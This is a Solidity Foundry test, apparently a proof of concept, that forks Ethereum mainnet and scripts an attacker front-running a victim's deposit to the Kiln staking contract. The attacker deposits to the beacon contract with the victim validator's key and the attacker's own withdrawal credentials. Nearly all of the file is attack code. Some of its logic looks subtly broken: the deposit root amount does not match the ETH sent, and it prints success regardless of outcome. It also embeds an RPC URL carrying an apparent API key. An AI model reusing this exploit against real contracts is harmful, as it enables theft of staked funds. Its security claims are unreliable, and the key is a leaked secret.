// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./BytesLib.sol";

interface IStakingContract {
    function deposit() external payable;
    function getAdmin() external view returns (address);
    function getWithdrawer(bytes calldata _publicKey) external view returns (address);
    function getELFeeRecipient(bytes calldata _publicKey) external view returns (address);
    function getCLFeeRecipient(bytes calldata _publicKey) external view returns (address);
    function withdrawELFee(bytes calldata _publicKey) external;
    function withdrawCLFee(bytes calldata _publicKey) external;
    function getOperator(uint256 _operatorIndex) external view returns (
        address operatorAddress,
        address feeRecipientAddress,
        uint256 limit,
        uint256 keys,
        uint256 funded,
        uint256 available,
        bool deactivated
    );
    function getAvailableValidatorCount() external view returns (uint256);
    function getValidator(uint256 _operatorIndex, uint256 _validatorIndex) external view returns (
        bytes memory publicKey,
        bytes memory signature,
        address withdrawer,
        bool funded
    );

    // Add events we need to track
    event Deposit(address indexed caller, address indexed withdrawer, bytes publicKey, bytes signature);
    event ValidatorKeysAdded(uint256 indexed operatorIndex, bytes publicKeys, bytes signatures);
}

interface IBeaconDepositContract {
    function deposit(
        bytes calldata pubkey,
        bytes calldata withdrawal_credentials,
        bytes calldata signature,
        bytes32 deposit_data_root
    ) external payable;
}

interface IBeaconChain {
    function exit(bytes calldata validatorPubkey) external;
    function withdraw(bytes calldata validatorPubkey) external;
}

contract TestPoC is Test {
    IStakingContract kiln;
    IBeaconDepositContract beacon;
    IBeaconChain beaconChain;
    address attacker;
    address victim;
    address admin;

    bytes32 constant DEPOSIT_SIZE_AMOUNT_LITTLEENDIAN64 = 0x0040597307000000000000000000000000000000000000000000000000000000;

    // Change amount to 1 ETH in little endian
    bytes32 constant ONE_ETH_AMOUNT_LITTLEENDIAN64 = 0x00ca9a3b00000000000000000000000000000000000000000000000000000000;

    function setUp() public {
        // Initialize the mainnet fork
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/Wywfs4ENMBaqohfR5Az9kb4nRFC_pVlf");

        // Assign the Kiln staking contract proxy address
        kiln = IStakingContract(0x1e68238cE926DEC62b3FBC99AB06eB1D85CE0270);
        beacon = IBeaconDepositContract(0x00000000219ab540356cBB839Cbe05303d7705Fa);
        beaconChain = IBeaconChain(0x5c161E7779a66e388762A8d68c85d046BC432670);

        // Get the current admin
        admin = kiln.getAdmin();

        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        // Fund the attacker and victim with ETH
        vm.deal(attacker, 5 ether);
        vm.deal(victim, 100 ether);

        // Inspect initial state
        (
            address operatorAddress,
            address feeRecipientAddress,
            uint256 limit,
            uint256 keys,
            uint256 funded,
            uint256 available,
            bool deactivated
        ) = kiln.getOperator(0);
        
        console.log("Operator:", operatorAddress);
        console.log("Fee Recipient:", feeRecipientAddress);
        console.log("Limit:", limit);
        console.log("Keys:", keys);
        console.log("Funded:", funded);
        console.log("Available:", available);
        console.log("Deactivated:", deactivated);
        
        uint256 availableValidators = kiln.getAvailableValidatorCount();
        console.log("Available Validators:", availableValidators);
    }

    function testBeaconDepositFrontrun() public {
        // Get next validator key that will be used
        (bytes memory pubKey, bytes memory sig,,) = kiln.getValidator(0, 23982);
        console.log("Target validator pubkey:");
        console.logBytes(pubKey);
        
        // Start recording logs
        vm.recordLogs();

        // 1. Attacker frontruns with minimal deposit
        vm.startPrank(attacker);
        bytes memory attackerCreds = abi.encodePacked(bytes1(0x01), bytes11(0), bytes20(attacker));
        beacon.deposit{value: 1 ether}(
            pubKey,
            attackerCreds,
            sig,
            _computeDepositDataRoot(pubKey, attackerCreds, sig)
        );
        vm.stopPrank();

        // Store attacker's deposit logs
        Vm.Log[] memory attackerLogs = vm.getRecordedLogs();
        vm.clearRecordedLogs();

        // 2. Victim deposits through Kiln
        vm.startPrank(victim);
        kiln.deposit{value: 32 ether}();
        vm.stopPrank();

        // Get victim's deposit logs
        Vm.Log[] memory victimLogs = vm.getRecordedLogs();

        // 3. Verify both deposits:
        // - Extract pubkey from both deposits
        // - Confirm they match
        // - Show withdrawal credentials were set to attacker
        bytes memory attackerPubkey;
        bytes memory victimPubkey;
        bytes memory withdrawalCreds;

        for (uint i = 0; i < attackerLogs.length; i++) {
            if (attackerLogs[i].topics[0] == keccak256("DepositEvent(bytes,bytes,bytes,bytes,bytes)")) {
                attackerPubkey = abi.decode(attackerLogs[i].data[0:96], (bytes));
                withdrawalCreds = abi.decode(attackerLogs[i].data[96:160], (bytes));
                console.log("Attacker deposit to validator:");
                console.logBytes(attackerPubkey);
                console.log("With withdrawal credentials:");
                console.logBytes(withdrawalCreds);
            }
        }

        for (uint i = 0; i < victimLogs.length; i++) {
            if (victimLogs[i].topics[0] == keccak256("DepositEvent(bytes,bytes,bytes,bytes,bytes)")) {
                victimPubkey = abi.decode(victimLogs[i].data[0:96], (bytes));
                console.log("Victim deposit to validator:");
                console.logBytes(victimPubkey);
            }
        }

        // Verify same validator was targeted
        assertEq(keccak256(attackerPubkey), keccak256(pubKey), "Attacker deposit should target predicted validator");
        assertEq(keccak256(victimPubkey), keccak256(pubKey), "Victim deposit should target same validator");
        
        console.log("Hijack successful - validator exits will pay", attacker);
    }

    function _sha256(bytes memory data) internal pure returns (bytes32) {
        return sha256(abi.encodePacked(data, bytes32(0)));
    }

    function _toLittleEndian64(uint64 value) internal pure returns (bytes memory) {
        bytes memory ret = new bytes(8);
        bytes8 bytesValue = bytes8(value);
        // Byteswapping during copying to bytes
        ret[0] = bytesValue[7];
        ret[1] = bytesValue[6];
        ret[2] = bytesValue[5];
        ret[3] = bytesValue[4];
        ret[4] = bytesValue[3];
        ret[5] = bytesValue[2];
        ret[6] = bytesValue[1];
        ret[7] = bytesValue[0];
        return ret;
    }

    function _computeDepositDataRoot(
        bytes memory pubkey,
        bytes memory withdrawal_credentials,
        bytes memory signature
    ) internal pure returns (bytes32) {
        // Compute amount for 1 ETH in Gwei
        bytes memory amount = _toLittleEndian64(uint64(1 gwei));

        bytes32 pubkey_root = sha256(abi.encodePacked(pubkey, bytes16(0)));
        bytes32 signature_root = sha256(abi.encodePacked(
            sha256(abi.encodePacked(BytesLib.slice(signature, 0, 64))),
            sha256(abi.encodePacked(BytesLib.slice(signature, 64, 32), bytes32(0)))
        ));
        
        return sha256(abi.encodePacked(
            sha256(abi.encodePacked(pubkey_root, withdrawal_credentials)),
            sha256(abi.encodePacked(amount, bytes24(0), signature_root))
        ));
    }
}
